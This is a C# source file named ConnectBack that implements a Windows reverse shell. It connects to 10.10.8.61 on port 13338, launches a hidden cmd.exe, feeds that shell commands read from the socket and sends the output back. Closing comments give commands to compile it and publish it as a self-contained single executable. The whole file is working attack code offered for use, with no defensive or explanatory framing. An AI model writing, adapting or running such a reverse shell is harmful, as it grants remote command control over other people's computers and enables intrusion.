using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security;
namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using (TcpClient client = new TcpClient("10.10.8.61", 13338))
			{
				using (Stream stream = client.GetStream())
				{
                    using (StreamReader rdr = new StreamReader(stream))
                    {
					
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();
						SecureString x = new SecureString();
						Process p = new Process();
                        p = Process.Start("cmd.exe","test","",x,"test");
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        // p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        // p.Start("cmd.exe","test","test",x,"test");
						p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err)
				{
				}
			}
		}		
	}
}


//C:\Windows\cd.0.30319\csc.exe .\test.cs


// dotnet publish -c Release -r win-x64 -o OutputFolder --self-contained true /p:PublishSingleFile=true /p:IncludeNativeLibrariesForSelfExtract=true